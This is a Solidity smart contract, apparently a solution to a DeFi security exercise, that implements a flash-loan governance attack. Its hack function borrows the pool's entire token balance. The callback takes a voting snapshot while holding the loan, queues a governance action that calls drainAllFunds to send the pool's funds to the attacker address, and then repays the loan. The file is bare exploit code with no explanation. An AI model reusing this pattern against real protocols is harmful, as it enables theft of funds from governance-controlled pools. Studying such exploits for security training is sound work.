// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IPool {
    function flashLoan(uint256 borrowAmount) external;
    function drainAllFunds(address receiver) external;
}

interface IGovernance {
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
}

interface ISnapshot {
    function snapshot() external returns (uint256);
}

contract HackGovernance {

    IPool pool;
    IERC20 token;
    address governance;
    address owner;

    constructor(address _pool, address _token, address _governance, address attacker) {
        pool = IPool(_pool);
        token = IERC20(_token);
        governance = _governance;
        owner = attacker;
    }

    function hack() external{
        uint256 balance = token.balanceOf(address(pool));
        pool.flashLoan(balance);
    }

    function receiveTokens(address _token, uint256 amount) external {
        bytes memory data = abi.encodeWithSelector(IPool.drainAllFunds.selector, owner);
        ISnapshot(_token).snapshot();
        IGovernance(governance).queueAction(address(pool), data, 0);
        IERC20(_token).transfer(address(pool), amount);
    }

}